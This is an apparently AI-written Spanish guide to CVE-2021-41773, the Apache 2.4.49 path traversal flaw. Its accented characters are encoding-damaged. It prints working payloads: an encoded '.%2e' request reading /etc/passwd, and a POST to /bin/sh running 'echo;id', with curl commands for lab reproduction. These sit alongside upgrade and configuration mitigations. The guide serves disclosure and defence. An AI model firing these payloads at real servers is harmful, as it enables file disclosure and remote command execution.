# CVE-2021-41773 Gu√≠a de Vulnerabilidad del Servidor Apache HTTP

## üîé Descripci√≥n General

- **CVE-2021-41773** afecta al servidor Apache HTTP **2.4.49**. Debido a un cambio defectuoso en la normalizaci√≥n de rutas, los atacantes pueden evadir los controles de seguridad usando codificaciones de URL especialmente dise√±adas.
- El resultado es una **traves√≠a de rutas** que puede exponer archivos sensibles. Si **mod_cgi** est√° habilitado, la vulnerabilidad tambi√©n permite **ejecuci√≥n remota de c√≥digo (RCE)**.
- La explotaci√≥n requiere una configuraci√≥n no predeterminada de Apache (por ejemplo, `<Directory /> Require all granted`).

## ‚ö†Ô∏è Impacto

- **Divulgaci√≥n de Archivos**:
  ```http
  GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
  ```
- **Ejecuci√≥n Remota de C√≥digo (con mod_cgi)**:
  ```http
  POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
  Content-Type: application/x-www-form-urlencoded

  echo;id
  ```
  Esto puede ejecutar comandos arbitrarios del sistema.

## üß™ Reproducci√≥n (Solo en Laboratorio Aislado)

1. **Instalar Apache 2.4.49**.
2. Configurar Apache con:
   ```apache
   <Directory />
     Require all granted
   </Directory>
   LoadModule cgid_module modules/mod_cgid.so
   ```
3. **Probar la traves√≠a de rutas**:
   ```bash
   curl "http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
   ```
4. **Probar RCE**:
   ```bash
   curl -X POST "http://localhost/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
        -d "echo;id"
   ```

**Usar solo en entornos aislados y legalmente controlados.**

## üõ°Ô∏è Mitigaci√≥n

1. **Actualizar a Apache 2.4.51 o superior**.
2. **Revisar configuraciones**:
   - Evitar usar `<Directory /> Require all granted`.
   - Preferir `Require all denied` como predeterminado.
3. **Deshabilitar mod_cgi/mod_cgid** si no es necesario.
4. **Aplicar defensa en profundidad**:
   - Firewalls de aplicaciones web (WAF) que filtren secuencias de puntos codificados.
   - Monitorear solicitudes POST relacionadas con CGI.

## üìù Glosario

- **Traves√≠a de Rutas**: Explotaci√≥n de directorios para acceder a archivos no intencionados.
- **%2e**: Codificaci√≥n URL para `.` (punto).
- **mod_cgi**: M√≥dulo de Apache para ejecutar scripts como shell o Perl.
- **Require all granted/denied**: Directivas de control de acceso de Apache.

## ‚úÖ Tabla Resumen

| Aspecto              | Detalles                               |
|----------------------|----------------------------------------|
| Versiones Afectadas  | Apache 2.4.49                          |
| Condiciones Requeridas | mod_cgi habilitado, Directorio permisivo |
| Tipos de Explotaci√≥n | Lectura de archivos, RCE              |
| Versi√≥n Corregida    | Apache 2.4.51                          |
| Nota de Seguridad    | Probar solo en entornos aislados      |

## üîÑ Pr√≥ximos Pasos

- Auditar las configuraciones de Apache.
- Actualizar todas las instalaciones de la versi√≥n 2.4.49.
- Solicita ayuda para reglas de firewall o para una exploraci√≥n t√©cnica m√°s profunda.
